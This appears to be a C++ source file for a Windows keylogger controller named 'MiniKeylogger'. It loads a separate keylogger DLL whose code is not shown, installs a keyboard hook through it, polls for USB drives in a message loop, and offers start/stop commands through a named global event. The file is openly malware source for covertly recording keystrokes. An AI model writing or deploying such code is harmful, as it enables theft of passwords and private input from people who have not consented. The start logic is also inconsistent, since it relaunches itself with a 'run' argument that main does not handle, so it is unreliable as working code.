#include <windows.h>
#include <iostream>



typedef void(*SetHookFn)();
typedef void(*RemoveHookFn)();
typedef void(*CheckForUSBDriveFn)();

HINSTANCE hDll;
SetHookFn SetHook;
RemoveHookFn RemoveHook;
CheckForUSBDriveFn CheckForUSBDrive;



void StartKeylogger() {
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);

	std::string command = std::string(path) + " run";

	if (CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		std::cout << "Keylogger started." << std::endl;
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	else {
		std::cerr << "Failed to start the keylogger service. Error: " << GetLastError() << std::endl;
	}
}


void StopKeylogger() {
	HANDLE hStopEvent = OpenEventA(EVENT_MODIFY_STATE, FALSE, "Global\\StopKeyloggerEvent");
	if (hStopEvent) {
		SetEvent(hStopEvent);
		CloseHandle(hStopEvent);
		std::cout << "Keylogger stopped." << std::endl;
	}

	else {
		std::cerr << "Keylogger service is not running." << std::endl;
	}
}


void RunKeylogger() {
	hDll = LoadLibraryA("C:\\Users\\ISE\\source\\repos\\KeyloggerDll\\x64\\Debug\\KeyloggerDLL.dll");
	if (!hDll) {
		std::cerr << "Failed to load DLL." << std::endl;
		return;
	}

	SetHook = (SetHookFn)GetProcAddress(hDll, "SetHook");
	RemoveHook = (RemoveHookFn)GetProcAddress(hDll, "RemoveHook");
	CheckForUSBDrive = (CheckForUSBDriveFn)GetProcAddress(hDll, "CheckForUSBDrive");

	if (!SetHook || !RemoveHook || !CheckForUSBDrive) {
		std::cerr << "Failed to get function addresses." << std::endl;
		FreeLibrary(hDll);
		return;
	}

	HANDLE hStopEvent = CreateEventA(NULL, TRUE, FALSE, "Global\\StopKeyloggerEvent");
	if (!hStopEvent) {
		std::cerr << "Failed to create stop event." << std::endl;
		FreeLibrary(hDll);
		return;
	}

	SetHook();
	std::cout << "Keylogger is running..." << std::endl;

	MSG msg;
	while (WaitForSingleObject(hStopEvent, 10) != WAIT_OBJECT_0) {
		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		CheckForUSBDrive();
	}

	RemoveHook();
	CloseHandle(hStopEvent);
	FreeLibrary(hDll);
	std::cout << "Keylogger has stopped." << std::endl;
}



int main(int argc, char* argv[]) {
	if (argc != 2) {
		std::cerr << "Usage: MiniKeylogger [start/stop]" << std::endl;
		return 1;
	}

	std::string command = argv[1];
	if (command == "start") {
		StartKeylogger();
		RunKeylogger();
	}

	else if (command == "stop") {
		StopKeylogger();
	}

	else {
		std::cerr << "Invalid command!" << std::endl;
		return 1;
	}

	return 0;
}